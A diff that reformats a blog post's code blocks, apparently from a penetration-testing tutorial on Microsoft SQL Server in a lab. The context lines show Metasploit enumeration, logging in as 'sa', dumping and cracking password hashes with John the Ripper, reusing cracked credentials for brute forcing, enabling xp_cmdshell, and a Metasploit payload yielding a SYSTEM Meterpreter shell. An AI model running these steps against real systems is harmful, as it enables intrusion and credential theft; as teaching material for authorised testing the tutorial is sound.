@@ -75,7 +75,7 @@ So you'll notice in the output nmap is reporting the version of mssql to be SQL 
 
 Next let's talk about looking for other ports that mssql may be listening on. For multiple reasons, like load balancing, mssql can listen on multiple ports. When pen testing mssql we want to know what those ports are so we can bang against them. Depending on the configuration you can authenticate to every listening mssql port. One thing to keep in mind is that you can authenticate to mssql using your normal windows / network / active directory credentials or you can authenticate using an account that was setup on the mssql server. This is basically known as windows authentication or sql authentication. When setting up the sql server and ports the database administrator will have to configure on how this authentication takes place. The easier target is using sql credentials as those are typically configured with a weaker password policy. Now that I've discussed some of the issues let's get cracking. So to determine additional ports that a database may be running on we'll once again turn to nmap. This time I told mssql to also listen on port 1444 and 1433.
 
-[![](images/multiplePortsMssql.png "multiplePortsMssql")](http://travisaltman.com/wp-content/multiplePortsMssql.png)
+![](/assets/multiplePortsMssql.png)
 
 So now go ahead and run the same nmap command as before.
 
@@ -183,7 +183,7 @@ Large dictionaries can take some time to run so keep that in mind when you're br
 
 I'm not going to touch on the third option but I will discuss the first and second option. So for the first option once we have credentials we can start to query the database. In this scenario I've got the best kind of credentials you can ask for on a mssql database which is the "sa" user. This will not always be the case but it's the example I've chosen to follow. One good thing to run with credentials is [metasploit's enum tool](http://www.metasploit.com/modules/auxiliary/admin/mssql/mssql_enum). This module basically gives you an overview of the sql server configuration and some note worthy security related configurations. Below is how to use mssql\_enum.
 
-\[cce\]
+```bash
 msf > use auxiliary/admin/mssql/mssql_enum
 msf  auxiliary(mssql_enum) > info
 
@@ -216,11 +216,11 @@ rhost => 192.168.134.132
 msf  auxiliary(mssql_enum) > set password password
 password => password
 msf  auxiliary(mssql_enum) > run
-\[/cce\]
+```
 
 Below is the output of running the tool.
 
-\[cce\]
+```bash
 [*] Running MS SQL Server Enumeration...
 [*] Version:
 [*] Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
@@ -325,41 +325,41 @@ Below is the output of running the tool.
 [*] Default Server Instance SQL Server Service is running under the privilege of:
 [*]     LocalSystem
 [*] Auxiliary module execution completed
-\[/cce\]
+```
 
 I'm not going to go through this entire output but all of it is relevant to security configuration. Things to note are permissions which the service runs as, password settings (e.g. account lock outs, password expiration), and stored procedures that are available. You can read more about [stored procedures](http://msdn.microsoft.com/en-us/library/aa174792(v=sql.80).aspx?ppud=4) but the main thing to know is that they extend the functionality of mssql by giving easy access to common tasks such as granting access to a database. The one stored procedure every pen tester wants access to is the mighty [xp\_cmdshell](http://msdn.microsoft.com/en-us/library/aa260689(v=sql.80).aspx) which allows you to execute operating system commands with a database call. So information that you can obtain, xp\_cmdshell enabled or disabled, about the database will help you to further assess or pen test the setup. Going forward it's best to have some sort of mssql client so that you can make sql queries to the database. I'm a fan of keeping things lightweight so I prefer command line clients and not GUI (graphical user interface) clients. So for accessing mssql from Linux I recommend [sqsh](http://www.sqsh.org/) and as for accessing from a windows PC I like the Microsoft SQL Server Command Line Utilities which will first require an install of the Microsoft SQL Server Native Client, both [microsoft tools can be found here](http://www.microsoft.com/download/en/details.aspx?id=16978). Now we'll get items of interest such as stored procedures but first let's use one of the clients mentioned to access and run some sql queries. The syntax for both clients is very similar but first let's look at the microsoft client. You'll first need to change to the proper folder where the sql client was installed.
 
-\[cce\]
+```bat
 Microsoft Windows XP \[Version 5.1.2600\] (C) Copyright 1985-2001 Microsoft Corp.
 C:\\WINDOWS\\system32>cd "c:\\Program Files\\Microsoft SQL Server\\90\\Tools\\binn"
 C:\\Program Files\\Microsoft SQL Server\\90\\Tools\\binn>
-\[/cce\]
+```
 
 So to connect to 192.168.134.132 run the following command.
 
-```bash
+```bat
 SQLCMD.exe -S 192.168.134.132 -U sa
 ```
 
 Below are the basic options for this command
 
-\[cce\]
+```bat
 -S for server name (IP or name)
 -U for user name
 -P for password (will prompt if not supplied)
-\[/cce\]
+```
 
 After you've run the above command you should see the following.
 
-\[cce\]
+```bat
 C:\Program Files\Microsoft SQL Server\90\Tools\binn>SQLCMD.EXE -S 192.168.134.132 -U sa
 Password:
 1>
-\[/cce\]
+```
 
 So the "1>" is the prompt where you will enter your sql commands, let's just run a basic sql query to confirm everything works, we'll query for the version in this case.
 
-\[cce\]\
+```bat
 1> select @@version
 2> go
 
@@ -374,11 +374,11 @@ Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
 
 (1 rows affected)
 1>
-\[/cce\]
+```
 
 So after typing your sql query you'll be dropped down to your second prompt "2>" there you will need to type "go" and hit enter for it to run your query. Running the sqsh client you'll get similar results.
 
-\[cce\]
+```bash
 root@bt:~# sqsh -S 192.168.134.132 -U sa
 sqsh-2.1 Copyright (C) 1995-2001 Scott C. Gray
 This is free software with ABSOLUTELY NO WARRANTY
@@ -397,7 +397,7 @@ Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
 
 (1 row affected)
 1>
-\[/cce\]
+```
 
 Just type "exit" if you want to leave the client. Another thing to note is the help menu for both commands. Below is the help command for sqsh.
 
@@ -423,9 +423,9 @@ So getting the versions of the database proves that our clients are working corr
 
 Determine the current user
 
-\[cce\]
+```bash
 select suser\_sname();
-\[/cce\]
+```
 
 Create user "travis" with password "secret"
 
@@ -485,7 +485,7 @@ select name, password\_hash FROM master.sys.sql\_logins
 
 You should see something like the following
 
-\[cce\]
+```bash
 1> select name, password_hash from master.sys.sql_logins
 2> go
 
@@ -505,7 +505,7 @@ sa
 travis
 
 01007c5b54a91367647bb18d6efc4de8e9e3560037e39e9f712e
-\[/cce\]
+```
 
 Now you can take that password hash and feed it into a password cracker such as [john the ripper](http://www.openwall.com/john/) but before you do that you'll need to add a zero plus X "0x" to the beginning of the password hash. This needs to be done because john the ripper expects password hashes in certain formats and if you need to know what that format is for various types of hash functions then [pentestmonkey](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) is a good resource for this type of information. So your modified hash with zero plus X in front should look like the following.
 
@@ -515,18 +515,18 @@ Now you can take that password hash and feed it into a password cracker such as 
 
 Now put that into a text file so we can feed it to john the ripper, in this case I named it mssqlHash.txt. Next all you have to do is use the command "john" along with the file that contains the password hashes as below.
 
-\[cce\]
+```bash
 root@bt:/pentest/passwords/john# john mssqlHash.txt
 Loaded 1 password hash (MS-SQL05 [ms-sql05 SSE2])
 secret           (?)
 guesses: 1  time: 0:00:00:00 100.00% (2) (ETA: Fri Dec 16 01:18:56 2011)  c/s: 400  trying: secret - service
-\[/cce\]
+```
 
 Here john the ripper was able to crack this hash and determined the password was "secret". So now that you've cracked some passwords on this database there's a good chance that username and password will work on other databases within the environment you're testing. Seeing how server and database admins like to keep things together that same username and password will probably work on another machine on the same vlan so just start nmap scanning to find those open ports then add the username and password you found into your medusa dictionary then let medusa do it's brute forcing and hopefully you'll find another database you can gain access to.
 
 The last technique I'll discuss is gaining access to the underlying operating system that the database is running on. Having sysadmin credentials on the database is awesome but having admin on the underlying operating system is even better. As I mentioned before the stored procedure xp\_cmdshell is the best way to gain this kind of access but as you can see from the metasploit enum module xp\_cmdshell isn't always at our disposal. The xp\_cmdshell was enabled by default on mssql 2000 but mssql 2005 and beyond by default does not enable this stored procedure. Even so a mssql 2000 database administrator could disable it as well. One way and maybe the easiest way is to use metasploits mssql\_payload module to enable the xp\_cmdshell and give you a meterpreter shell back. Below is the command you'll need to run. You have to set at least the host you're targeting (rhost) and the password of the "sa" account. This module will not work unless the user you're authenticating with has sysadmin credentials, so the account doesn't have to be "sa" but it has to be a user with a sysadmin role.
 
-\[cce\]
+```bash
 msf > use exploit/windows/mssql/mssql_payload
 msf  exploit(mssql_payload) > set rhost 192.168.134.132
 rhost => 192.168.134.132
@@ -546,11 +546,11 @@ snip
 [*] Meterpreter session 1 opened (192.168.134.135:4444 -> 192.168.134.132:1046) at 2011-12-21 22:43:36 -0500
 
 meterpreter >
-\[/cce\]
+```
 
 So at this point we have a meterpreter command prompt on the target computer which is better than a regular windows command prompt. From here we can launch a number of attacks. I'm not going to touch on those for that just simply google "post exploitation" to get an idea of what you may want to accomplish next. At this point its a good idea to make sure you're on the right computer and determine the types of credentials we have on our target machine. The following commands will determine that information.
 
-\[cce\]
+```
 meterpreter > ipconfig
 
 MS TCP Loopback interface
@@ -565,11 +565,11 @@ Netmask     : 255.255.255.0
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
-\[/cce\]
+```
 
 So we're on the correct computer and we have "system" credentials which is the highest credentials you can have on a windows platform. Great success. At the heart of this metasploit module is some sql commands that will enable the xp\_cmdshell. If you wanted to manually enable xp\_cmdshell you could enter the sql commands below.
 
-\[cce\]
+```bash
 1> SP_CONFIGURE 'show advanced options', 1
 2> go
 Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
@@ -583,6 +583,6 @@ Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE stat
 1> reconfigure
 2> go
 1>
-\[/cce\]
+```
 
 That's all folks, more could be covered here but this will get you started. Once again I haven't covered anything new here and this documentation is meant to capture some of the common tasks that need to be completed when testing mssql. Hope this helps and happy mssql hunting.
